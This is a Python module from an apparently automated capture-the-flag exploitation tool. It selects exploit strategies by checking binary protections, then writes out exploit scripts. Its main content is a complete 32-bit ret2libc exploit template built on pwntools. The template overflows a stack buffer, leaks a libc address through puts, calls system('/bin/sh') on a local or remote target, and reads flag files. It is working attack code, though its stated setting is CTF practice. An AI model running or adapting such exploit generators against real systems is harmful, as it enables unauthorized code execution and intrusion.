"""Deterministic exploit fast paths.

PwnProof already generates ret2win, a format-string probe, and an x86-64
ret2libc path. PwnAgent adds a 32-bit ret2libc generator (classic cdecl) and a
common entry point that is safe to call from every attempt.
"""

from __future__ import annotations

import re
from pathlib import Path

from .vendor.pwnproof.heuristics import (
    generate_format_probe,
    generate_ret2libc,
    generate_ret2win,
)
from .vendor.pwnproof.triage import BinaryFacts


WIN_NAMES = ("win", "get_shell", "give_shell", "backdoor", "shell", "print_flag", "cat_flag")


def _buffer_size(facts: BinaryFacts) -> int | None:
    sizes: list[int] = []
    for signal in facts.source_signals:
        match = re.search(r"(?:possible )?stack buffer size (\d+)", signal)
        if match:
            sizes.append(int(match.group(1)))
    unique = set(sizes)
    return unique.pop() if len(unique) == 1 else None


def _protection(facts: BinaryFacts, key: str) -> str:
    return str(facts.protections.get(key, "")).lower()


def supports_ret2libc32(facts: BinaryFacts) -> bool:
    if facts.bits != 32:
        return False
    nx = _protection(facts, "nx")
    if "enabled" not in nx or "disabled" in nx:
        return False
    if "no canary" not in _protection(facts, "canary") and "disabled" not in _protection(facts, "canary"):
        return False
    if "no pie" not in _protection(facts, "pie") and "disabled" not in _protection(facts, "pie"):
        return False
    if "main" not in facts.symbols or "puts" not in facts.suspicious_functions:
        return False
    return _buffer_size(facts) is not None


def generate_ret2libc32(facts: BinaryFacts, workspace: Path) -> str | None:
    """Classic 32-bit cdecl ret2libc: puts@plt(puts@got) -> main -> system('/bin/sh')."""

    if not supports_ret2libc32(facts):
        return None
    buffer_size = _buffer_size(facts)
    if buffer_size is None:
        return None
    offset = buffer_size + 4
    script = r'''#!/usr/bin/env python3
"""Generated by PwnAgent: classic 32-bit ret2libc."""
import os
import re
from pathlib import Path

from pwn import ELF, context, p32, process, remote

context.log_level = "error"
context.arch = "i386"
target = Path(os.environ["TARGET"])
target_dir = target.parent
elf = ELF(str(target), checksec=False)

host = os.environ.get("HOST", "")
port = os.environ.get("PORT", "")
if host and port:
    p = remote(host, int(port))
else:
    loaders = (target_dir / "ld-linux.so.2", target_dir / "ld-linux-x86-64.so.2")
    loader = next((item for item in loaders if item.is_file()), None)
    if loader:
        p = process([str(loader), "--library-path", str(target_dir), str(target)], cwd=str(target_dir))
    else:
        p = process([str(target)], cwd=str(target_dir))

libc_candidates = []
if os.environ.get("PWNPROOF_LIBC"):
    configured = Path(os.environ["PWNPROOF_LIBC"])
    if not configured.is_absolute():
        configured = target_dir / configured
    libc_candidates.append(configured)
libc_candidates += [
    target_dir / "libc.so.6",
    target_dir / "libc.so",
    target_dir / "libc-2.23.so",
    Path("/lib/i386-linux-gnu/libc.so.6"),
    Path("/usr/lib/i386-linux-gnu/libc.so.6"),
]
libc_path = next((item for item in libc_candidates if item and item.is_file()), None)
if not libc_path:
    print("NO LIBC CANDIDATE")
    raise SystemExit(1)
libc = ELF(str(libc_path), checksec=False)

offset = __OFFSET__
main = elf.symbols["main"]
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]

# cdecl: return-to puts@plt, return address main, argument puts@got
stage1 = b"A" * offset + p32(puts_plt) + p32(main) + p32(puts_got)
p.sendline(stage1)
leaked_output = p.recv(timeout=1.0)

puts_offset = int(libc.symbols["puts"])
puts_low12 = puts_offset & 0xFFF
puts_addr = None
for index in range(len(leaked_output) - 3):
    value = int.from_bytes(leaked_output[index:index + 4], "little")
    candidate_base = value - puts_offset
    if (value & 0xFFF) == puts_low12 and candidate_base > 0 and candidate_base < 0x80000000 and candidate_base & 0xFFF == 0:
        puts_addr = value
if puts_addr is None:
    print("RAW LEAK:", leaked_output.hex())
    print("NO LIBC POINTER FOUND")
    raise SystemExit(1)

libc.address = puts_addr - puts_offset
binsh = next(libc.search(b"/bin/sh\x00"))
stage2 = b"B" * offset + p32(libc.symbols["system"]) + p32(0) + p32(binsh)
p.sendline(stage2)
p.sendline(b'cat flag* /flag* 2>/dev/null; echo "$PWNPROOF_FLAG"')
output = p.recvall(timeout=4).decode("utf-8", errors="replace")
print(output)
if not re.search(r"[A-Za-z0-9_]+\{[^}\r\n]+\}", output):
    raise SystemExit(1)
'''
    return script.replace("__OFFSET__", str(offset))


def generate_candidate(facts: BinaryFacts, workspace: Path, exploit_dir: Path) -> Path | None:
    exploit_dir.mkdir(parents=True, exist_ok=True)
    generators = [
        ("heuristic_ret2win.py", lambda: generate_ret2win(facts, workspace)),
        ("heuristic_ret2libc.py", lambda: generate_ret2libc(facts, workspace)),
        ("heuristic_ret2libc32.py", lambda: generate_ret2libc32(facts, workspace)),
        ("heuristic_format_probe.py", lambda: generate_format_probe(facts, workspace)),
    ]
    for filename, generator in generators:
        try:
            body = generator()
        except Exception:
            body = None
        if body:
            path = exploit_dir / filename
            path.write_text(body, encoding="utf-8", newline="\n")
            return path
    return None


def generate_for_strategy(
    strategy: str, facts: BinaryFacts, workspace: Path, exploit_dir: Path
) -> Path | None:
    """Only generate the fast path that matches the attempt's specialization."""

    exploit_dir.mkdir(parents=True, exist_ok=True)
    body = None
    filename = ""
    if strategy == "manual":
        return generate_candidate(facts, workspace, exploit_dir)
    if strategy == "ret2win":
        filename = "heuristic_ret2win.py"
        body = generate_ret2win(facts, workspace)
    elif strategy == "ret2libc":
        filename = "heuristic_ret2libc.py"
        body = generate_ret2libc(facts, workspace)
        if not body:
            filename = "heuristic_ret2libc32.py"
            body = generate_ret2libc32(facts, workspace)
    elif strategy == "fmtstr":
        filename = "heuristic_format_probe.py"
        body = generate_format_probe(facts, workspace)
    if not body:
        return None
    path = exploit_dir / filename
    path.write_text(body, encoding="utf-8", newline="\n")
    return path
